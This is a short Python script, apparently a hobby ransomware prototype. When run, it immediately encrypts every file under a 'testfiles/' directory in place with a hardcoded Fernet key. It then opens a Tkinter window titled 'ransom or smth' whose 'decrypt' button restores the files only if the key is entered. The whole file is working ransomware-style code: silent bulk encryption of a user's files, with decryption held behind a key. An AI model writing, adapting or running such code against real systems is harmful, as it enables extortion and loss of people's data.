import os
import tkinter as tk
from tkinter import filedialog
from cryptography.fernet import Fernet

key = "oC0Bk45AWRz-WTDPWZKWHXFuxC7iTAviLLAnYSXv_mc="
directory_to_encrypt = "testfiles/"
directory_to_decrypt = "testfiles/"


def generate_key():
    key = Fernet.generate_key()
    with open("key.key", "wb") as key_file:
        key_file.write(key)

def load_key():
    return open("key.key", "rb").read()

def encrypt_file(filename, key):
    fernet = Fernet(key)
    with open(filename, "rb") as file:
        file_data = file.read()
    encrypted_data = fernet.encrypt(file_data)
    with open(filename, "wb") as file:
        file.write(encrypted_data)

def encrypt_directory(directory, key):
    for root, dirs, files in os.walk(directory):
        for file in files:
            file_path = os.path.join(root, file)
            encrypt_file(file_path, key)

def decrypt_file(filename, key):
    fernet = Fernet(key)
    with open(filename, "rb") as file:
        file_data = file.read()
    decrypted_data = fernet.decrypt(file_data)
    with open(filename, "wb") as file:
        file.write(decrypted_data)

def decrypt_directory(directory, key):
    for root, dirs, files in os.walk(directory):
        for file in files:
            file_path = os.path.join(root, file)
            decrypt_file(file_path, key)

def ask_for_key():
    key_input = tk.simpledialog.askstring("Key input", "Enter Key")
    if key_input:
        return key_input.encode()
    else:
        return None

def encrypt_directory_gui():
    
    if directory_to_encrypt:
        if key:
            encrypt_directory(directory_to_encrypt, key)

def decrypt_directory_gui():
    if directory_to_decrypt:
        key = ask_for_key()
        if key:
            decrypt_directory(directory_to_decrypt, key)
        

encrypt_directory_gui()

if __name__ == "__main__":
    

    root = tk.Tk()
    root.title("ransom or smth")


    decrypt_button = tk.Button(root, text="decrypt", command=decrypt_directory_gui)
    decrypt_button.pack(pady=10)

    root.mainloop()
